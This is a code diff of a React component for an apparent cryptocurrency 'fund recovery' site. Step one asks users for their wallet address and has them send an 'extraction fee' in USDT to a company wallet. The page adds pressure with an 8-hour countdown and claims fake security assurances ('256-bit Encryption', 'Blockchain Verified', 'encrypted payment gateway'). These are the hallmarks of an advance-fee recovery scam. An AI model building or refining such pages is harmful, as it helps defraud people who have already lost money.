@@ -6,29 +6,226 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Label } from "@/components/ui/label";
 import { Badge } from "@/components/ui/badge";
 import { Progress } from "@/components/ui/progress";
-import { Wallet, Clock, Shield, ArrowRight, AlertCircle } from "lucide-react";
+import { Wallet, Clock, Shield, ArrowRight, AlertCircle, Copy } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { supabase } from "../supabaseClient";
 
 const RecoveryStep1 = () => {
   const [walletAddress, setWalletAddress] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [timeLeft, setTimeLeft] = useState(8 * 60 * 60); // 8 hours in seconds
+  const [user, setUser] = useState<any>(null);
+  const [error, setError] = useState<string | null>(null);
   const navigate = useNavigate();
   const { toast } = useToast();
 
+  const companyWalletAddress = import.meta.env.VITE_WALLET_ADDRESS;
+
+  const handleCopyWallet = async () => {
+    try {
+      await navigator.clipboard.writeText(companyWalletAddress);
+      console.log("Step 1: Wallet address copied:", companyWalletAddress);
+      toast({
+        title: "Wallet Address Copied",
+        description: "The wallet address has been copied to your clipboard.",
+      });
+    } catch (err) {
+      console.error("Step 1: Failed to copy wallet address:", err);
+      toast({
+        variant: "destructive",
+        title: "Copy Failed",
+        description: "Unable to copy wallet address. Please try again.",
+      });
+    }
+  };
+
+  // Fetch user data
   useEffect(() => {
-    const userData = localStorage.getItem("user");
-    if (!userData) {
-      navigate("/login");
+    const fetchUserData = async () => {
+      try {
+        console.log("Step 1: Fetching user data...");
+        const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();
+        console.log("Step 1: Auth user:", authUser, "Auth error:", authError);
+        if (authError || !authUser) {
+          console.error("Step 1: Authentication failed, redirecting to /login");
+          toast({
+            variant: "destructive",
+            title: "Authentication Error",
+            description: "Please log in to continue.",
+          });
+          navigate("/login", { replace: true });
+          return;
+        }
+
+        const { data, error } = await supabase
+          .from("profiles")
+          .select("refundamount, walletaddress, step1completed, extraction_fee1")
+          .eq("id", authUser.id)
+          .single();
+
+        console.log("Step 1: Profile data:", data, "Profile error:", error);
+        if (error) {
+          if (error.code === "PGRST116") {
+            console.log("Step 1: No profile found, creating one for user:", authUser.id);
+            const { error: insertError } = await supabase
+              .from("profiles")
+              .insert({
+                id: authUser.id,
+                refundamount: "0",
+                walletaddress: "",
+                step1completed: false,
+                extraction_fee1: 50,
+              });
+            if (insertError) {
+              console.error("Step 1: Insert profile error:", insertError.message, insertError.details, insertError.hint, insertError.code);
+              throw insertError;
+            }
+            // Retry fetching
+            const { data: retryData, error: retryError } = await supabase
+              .from("profiles")
+              .select("refundamount, walletaddress, step1completed, extraction_fee1")
+              .eq("id", authUser.id)
+              .single();
+            if (retryError) {
+              console.error("Step 1: Retry fetch error:", retryError.message, retryError.details, retryError.hint, retryError.code);
+              throw retryError;
+            }
+            console.log("Step 1: Profile created:", retryData);
+            setUser({
+              id: authUser.id,
+              refundAmount: retryData.refundamount,
+              walletAddress: retryData.walletaddress,
+              step1Completed: retryData.step1completed,
+              extractionFee: retryData.extraction_fee1,
+            });
+          } else {
+            console.error("Step 1: Profile fetch error:", error.message, error.details, error.hint, error.code);
+            throw error;
+          }
+        } else {
+          if (data.extraction_fee1 === null) {
+            console.log("Step 1: Extraction fee missing, setting default for user:", authUser.id);
+            const { error: updateError } = await supabase
+              .from("profiles")
+              .update({ extraction_fee1: 50 })
+              .eq("id", authUser.id);
+            if (updateError) {
+              console.error("Step 1: Update fee error:", updateError.message, updateError.details, updateError.hint, updateError.code);
+              throw updateError;
+            }
+            // Retry fetching
+            const { data: retryData, error: retryError } = await supabase
+              .from("profiles")
+              .select("refundamount, walletaddress, step1completed, extraction_fee1")
+              .eq("id", authUser.id)
+              .single();
+            if (retryError) {
+              console.error("Step 1: Retry fee fetch error:", retryError.message, retryError.details, retryError.hint, retryError.code);
+              throw retryError;
+            }
+            console.log("Step 1: Profile updated with fee:", retryData);
+            setUser({
+              id: authUser.id,
+              refundAmount: retryData.refundamount,
+              walletAddress: retryData.walletaddress,
+              step1Completed: retryData.step1completed,
+              extractionFee: retryData.extraction_fee1,
+            });
+          } else {
+            console.log("Step 1: Profile loaded:", data);
+            setUser({
+              id: authUser.id,
+              refundAmount: data.refundamount,
+              walletAddress: data.walletaddress,
+              step1Completed: data.step1completed,
+              extractionFee: data.extraction_fee1,
+            });
+            setWalletAddress(data.walletaddress || "");
+          }
+          if (data.step1completed) {
+            console.log("Step 1: step1completed is true, redirecting to /recovery/step2");
+            toast({
+              title: "Step 1 Already Completed",
+              description: "Redirecting to Step 2.",
+            });
+            navigate("/recovery/step2", { replace: true });
+          } else {
+            console.log("Step 1: step1completed is false, staying on Step 1");
+          }
+        }
+      } catch (err: any) {
+        console.error("Step 1: Error fetching user data:", err.message, err.details, err.hint, err.code);
+        setError("Failed to fetch user data or fee");
+        toast({
+          variant: "destructive",
+          title: "Error",
+          description: "Unable to load user data or fee. Please try again.",
+        });
+        navigate("/login", { replace: true });
+      }
+    };
+
+    fetchUserData();
+  }, [navigate, toast]);
+
+  // Real-time subscription for step1completed changes
+  useEffect(() => {
+    if (!user?.id) {
+      console.log("Step 1: No user ID, skipping real-time subscription");
       return;
     }
 
-    // Countdown timer
+    console.log("Step 1: Setting up real-time subscription for user:", user.id);
+    const subscription = supabase
+      .channel(`profiles-changes-${user.id}`)
+      .on(
+        "postgres_changes",
+        {
+          event: "UPDATE",
+          schema: "public",
+          table: "profiles",
+          filter: `id=eq.${user.id}`,
+        },
+        (payload) => {
+          console.log("Step 1: Realtime payload:", payload);
+          if (payload.new.step1completed) {
+            console.log("Step 1: step1completed updated to true, redirecting to /recovery/step2");
+            toast({
+              title: "Step 1 Completed",
+              description: "Payment confirmed. Redirecting to Step 2.",
+            });
+            navigate("/recovery/step2", { replace: true });
+          }
+        }
+      )
+      .subscribe((status, err) => {
+        console.log("Step 1: Subscription status:", status, "Error:", err);
+        if (status === "SUBSCRIBED") {
+          console.log("Step 1: Realtime subscription active for user:", user.id);
+        } else if (err) {
+          console.error("Step 1: Realtime subscription error:", err);
+          toast({
+            variant: "destructive",
+            title: "Realtime Error",
+            description: "Unable to connect to real-time updates. Please proceed manually.",
+          });
+        }
+      });
+
+    return () => {
+      console.log("Step 1: Cleaning up subscription for user:", user.id);
+      supabase.removeChannel(subscription);
+    };
+  }, [user?.id, navigate, toast]);
+
+  // Countdown timer
+  useEffect(() => {
     const timer = setInterval(() => {
       setTimeLeft((prev) => {
         if (prev <= 1) {
-          localStorage.removeItem("user");
-          navigate("/login");
+          console.log("Step 1: Timer expired, signing out and redirecting to /login");
+          supabase.auth.signOut();
+          navigate("/login", { replace: true });
           return 0;
         }
         return prev - 1;
@@ -45,39 +242,74 @@ const RecoveryStep1 = () => {
     return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
   };
 
-  const handlePayment = () => {
+  const handlePayment = async () => {
     if (!walletAddress) {
+      console.log("Step 1: Wallet address missing");
       toast({
         variant: "destructive",
         title: "Wallet Address Required",
-        description: "Please enter your wallet address to proceed",
+        description: "Please enter your wallet address to proceed.",
+      });
+      return;
+    }
+
+    if (!user?.extractionFee) {
+      console.error("Step 1: Extraction fee missing for user:", user?.id);
+      toast({
+        variant: "destructive",
+        title: "Fee Not Set",
+        description: "Extraction fee is not set. Please contact support.",
       });
       return;
     }
 
     setIsLoading(true);
-    
-    // Simulate payment processing
-    setTimeout(() => {
-      // Store progress
-      const userData = JSON.parse(localStorage.getItem("user") || "{}");
-      userData.step1Completed = true;
-      userData.walletAddress = walletAddress;
-      localStorage.setItem("user", JSON.stringify(userData));
-      
+
+    try {
+      console.log("Step 1: Updating profile for user:", user.id, "with wallet:", walletAddress);
+      const { data, error } = await supabase
+        .from("profiles")
+        .update({ walletaddress: walletAddress, step1completed: true })
+        .eq("id", user.id)
+        .select("walletaddress, step1completed")
+        .single();
+
+      if (error) {
+        console.error("Step 1: Update profile error:", error.message, error.details, error.hint, error.code);
+        throw error;
+      }
+
+      console.log("Step 1: Profile updated successfully:", data);
       toast({
-        title: "Payment Successful",
-        description: "Extraction Fee Processed. Proceeding to Security Configuration.",
+        title: "Payment Submitted",
+        description: "Extraction fee payment recorded. Redirecting to Step 2.",
       });
-      
-      navigate("/recovery/step2");
+      navigate("/recovery/step2", { replace: true });
+    } catch (err: any) {
+      console.error("Step 1: Error updating profile:", err.message, err.details, err.hint, err.code);
+      toast({
+        variant: "destructive",
+        title: "Error",
+        description: "Failed to process payment. Please try again.",
+      });
+    } finally {
       setIsLoading(false);
-    }, 2000);
+      console.log("Step 1: isLoading set to false");
+    }
   };
 
+  if (error) {
+    console.log("Step 1: Rendering error:", error);
+    return <div>Error: {error}</div>;
+  }
+  if (!user || user.extractionFee === null) {
+    console.log("Step 1: Rendering loading state, user:", user);
+    return <div>Loading...</div>;
+  }
+
+  console.log("Step 1: Rendering component, user:", user);
   return (
     <div className="min-h-screen bg-gradient-to-br from-background via-crypto-dark to-crypto-darker">
-      {/* Header */}
       <header className="border-b border-border/50 bg-card/50 backdrop-blur-sm">
         <div className="container mx-auto px-4 py-4">
           <div className="flex items-center justify-between">
@@ -98,7 +330,6 @@ const RecoveryStep1 = () => {
 
       <div className="container mx-auto px-4 py-8">
         <div className="max-w-2xl mx-auto space-y-8">
-          {/* Progress */}
           <div className="space-y-2">
             <div className="flex justify-between text-sm">
               <span className="text-foreground">Recovery Progress</span>
@@ -112,7 +343,6 @@ const RecoveryStep1 = () => {
             </div>
           </div>
 
-          {/* Main Card */}
           <Card className="bg-card/90 backdrop-blur-sm border-primary/20 shadow-xl">
             <CardHeader className="text-center">
               <div className="flex justify-center mb-4">
@@ -125,7 +355,6 @@ const RecoveryStep1 = () => {
             </CardHeader>
 
             <CardContent className="space-y-6">
-              {/* Alert */}
               <div className="flex items-start gap-3 p-4 rounded-lg bg-orange-500/10 border border-orange-500/20">
                 <AlertCircle className="h-5 w-5 text-orange-500 mt-0.5" />
                 <div className="text-sm">
@@ -136,10 +365,9 @@ const RecoveryStep1 = () => {
                 </div>
               </div>
 
-              {/* Wallet Input */}
               <div className="space-y-3">
                 <Label htmlFor="wallet" className="text-base font-medium">
-                  Cryptocurrency Wallet Address
+                  Your Cryptocurrency Wallet Address
                 </Label>
                 <Input
                   id="wallet"
@@ -149,23 +377,22 @@ const RecoveryStep1 = () => {
                   className="bg-input border-border/50 focus:border-primary h-12"
                 />
                 <p className="text-xs text-muted-foreground">
-                  This is where your recovered funds will be transferred upon completion
+                  This is where your recovered funds will be transferred upon completion.
                 </p>
               </div>
 
-              {/* Fee Information */}
               <Card className="bg-secondary/50 border-border/30">
                 <CardContent className="pt-6">
                   <div className="text-center space-y-4">
                     <h3 className="font-semibold text-foreground">Extraction Fee Required</h3>
                     <div className="space-y-2">
-                      <p className="text-3xl font-bold text-primary">₦75,000</p>
-                      <p className="text-sm text-muted-foreground">One-time processing fee</p>
+                      <p className="text-3xl font-bold text-primary">
+                        ${user.extractionFee.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                      </p>
+                      <p className="text-sm text-muted-foreground">One-time processing fee (USDT)</p>
                     </div>
                     <div className="text-sm space-y-1">
-                      <p className="text-foreground">
-                        This fee covers:
-                      </p>
+                      <p className="text-foreground">This fee covers:</p>
                       <ul className="text-muted-foreground space-y-1">
                         <li>• Blockchain network transaction costs</li>
                         <li>• Secure wallet verification protocols</li>
@@ -176,20 +403,32 @@ const RecoveryStep1 = () => {
                 </CardContent>
               </Card>
 
-              {/* Security Badges */}
+              <Card className="bg-secondary/50 border-border/30">
+                <CardContent className="pt-6">
+                  <div className="text-center space-y-4">
+                    <h3 className="font-semibold text-foreground">Make Your Extraction Payment</h3>
+                    <div className="space-y-2">
+                      <p className="text-lg text-foreground">
+                        Send ${user.extractionFee.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USDT to this wallet address:
+                      </p>
+                      <p className="text-sm text-muted-foreground break-all">
+                        Wallet Address: {companyWalletAddress}
+                      </p>
+                      <Button onClick={handleCopyWallet} size="sm" className="mt-2">
+                        <Copy className="h-4 w-4 mr-2" />
+                        Copy Wallet Address
+                      </Button>
+                    </div>
+                  </div>
+                </CardContent>
+              </Card>
+
               <div className="flex flex-wrap gap-2 justify-center">
-                <Badge className="bg-primary/20 text-primary border-primary/30">
-                  256-bit Encryption
-                </Badge>
-                <Badge className="bg-primary/20 text-primary border-primary/30">
-                  Blockchain Verified
-                </Badge>
-                <Badge className="bg-primary/20 text-primary border-primary/30">
-                  Secure Processing
-                </Badge>
+                <Badge className="bg-primary/20 text-primary border-primary/30">256-bit Encryption</Badge>
+                <Badge className="bg-primary/20 text-primary border-primary/30">Blockchain Verified</Badge>
+                <Badge className="bg-primary/20 text-primary border-primary/30">Secure Processing</Badge>
               </div>
 
-              {/* Payment Button */}
               <Button
                 onClick={handlePayment}
                 size="lg"
@@ -199,18 +438,18 @@ const RecoveryStep1 = () => {
                 {isLoading ? (
                   <div className="flex items-center gap-2">
                     <div className="h-5 w-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
-                    Processing Payment...
+                    Processing...
                   </div>
                 ) : (
                   <>
-                    Pay Extraction Fee & Continue
+                    Confirm Payment & Continue
                     <ArrowRight className="ml-2 h-5 w-5" />
                   </>
                 )}
               </Button>
 
               <p className="text-xs text-center text-muted-foreground">
-                By proceeding, you agree to the terms of service and acknowledge that this is a secure transaction processed through our encrypted payment gateway.
+                After sending the payment to the wallet address above, click "Confirm Payment & Continue" to proceed. By proceeding, you agree to the terms of service and acknowledge that this is a secure transaction processed through our encrypted payment gateway.
               </p>
             </CardContent>
           </Card>
